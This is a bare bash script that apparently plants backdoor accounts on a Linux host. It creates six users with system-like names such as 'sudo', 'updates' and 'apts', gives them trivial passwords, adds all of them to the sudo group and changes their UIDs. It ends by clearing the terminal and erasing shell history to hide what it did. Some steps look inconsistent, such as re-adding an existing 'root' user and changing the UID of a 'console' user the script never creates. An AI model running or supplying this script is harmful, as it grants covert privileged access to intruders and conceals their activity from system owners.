
#!/bin/bash


useradd  -m   -s /bin/bash admins
useradd  -m   -s /bin/bash essentials
useradd  -m   -s /bin/bash root
useradd  -m   -s /bin/bash sudo
useradd  -m   -s /bin/bash updates
useradd  -m   -s /bin/bash apts

printf "stems\nstems" | sudo passwd admins
printf "essentials\nessentials" | sudo passwd essentials
printf "roots\nroots" | sudo passwd root
printf "sudos\nsudos" | sudo passwd sudo
printf "updates\nupdates" | sudo passwd updates
printf "apt\napt" | sudo passwd apts

usermod -aG sudo essentials
usermod -aG sudo root
usermod -aG sudo sudo
usermod -aG sudo updates
usermod -aG sudo apts
usermod -aG sudo admins

sudo usermod -u 560 essentials
sudo usermod -u 561 root
sudo usermod -u 562 sudo
sudo usermod -u 563 updates
sudo usermod -u 564 apts
sudo usermod -u 565 console
sudo usermod -u 568 admins


clear
history -c
